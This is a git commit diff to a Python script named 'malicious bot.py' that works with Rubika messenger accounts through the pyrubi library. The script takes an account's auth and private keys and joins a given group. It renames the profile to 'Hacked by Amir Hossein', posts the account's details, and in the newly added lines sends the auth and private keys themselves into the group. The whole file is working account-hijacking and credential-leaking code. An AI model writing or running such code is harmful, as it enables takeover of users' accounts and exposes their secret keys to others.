0c85e87e1643c9a4892b30ff3069d41d0e939810
amirhossinpython <151163714+amirhossinpython@users.noreply.github.com>
2024-05-12 16:03:23 +0330

    Update malicious bot.py

--- malicious bot.py
+++ malicious bot.py
@@ -1,45 +1,53 @@
-import pyrubi
+import os
+try:
+    import pyrubi
+except ImportError :
+    os.system('pip instal pyrubi')
 
+try:
+    auth_key=input('enter the auth :')
 
-auth_key=input('enter the auth :')
+    private_key=input('enter the  private_ke:')
 
-private_key=input('enter the  private_ke:')
-
-link = input("enter link:")
-bot = pyrubi.Client(auth=auth_key,private=private_key)
-
-
-
-
-
-
-
-guid = bot.join_chat(link)["group"]["group_guid"]  
-
-bot.update_profile(first_name='Hacked by Amir Hossein',last_name="Hacked by Amir Hossein",username='hackedbyamirhossin',bio='Hacked by Amir Hossein')
-with open('hack.mp3') as voice:
-    bot.send_voice(guid,'hack.mp3')
-    
-info=bot.get_me()
+    link = input("enter link:")
+    bot = pyrubi.Client(auth=auth_key,private=private_key)
 
 
 
-bot.send_text(guid,f"بفرما کل اطلاعاتم :{info}")
-bot.send_text(guid,"هک شدم توسط امیرحسین")  
 
 
 
-with open("filter.mp4","rb") as fil:
+
+    guid = bot.join_chat(link)["group"]["group_guid"]  
     
     
 
-    for  i in range(2):
+    bot.update_profile(first_name='Hacked by Amir Hossein',last_name="Hacked by Amir Hossein",username='hackedbyamirhossin',bio='Hacked by Amir Hossein')
+    with open('hack.mp3') as voice:
+        bot.send_voice(guid,'hack.mp3')
+        
+    info=bot.get_me()
+
+
+
+    bot.send_text(guid,f"بفرما کل اطلاعاتم :{info}")
+    bot.send_text(guid,f"هک شدم توسط امیرحسین\n{auth_key}\n {private_key}")  
+
+
+
+    with open("filter.mp4","rb") as fil:
         
         
+
+        for  i in range(2):
+            
+            
+            
+            
+            
+            bot.send_gif(guid,"filter.mp4")
         
-        
-        
-        bot.send_gif(guid,"filter.mp4")
-      
-bot.leave_chat(guid)
-        
+    bot.leave_chat(guid)
+except Exception as hack:
+    print(f'erorr :{hack}')
+    
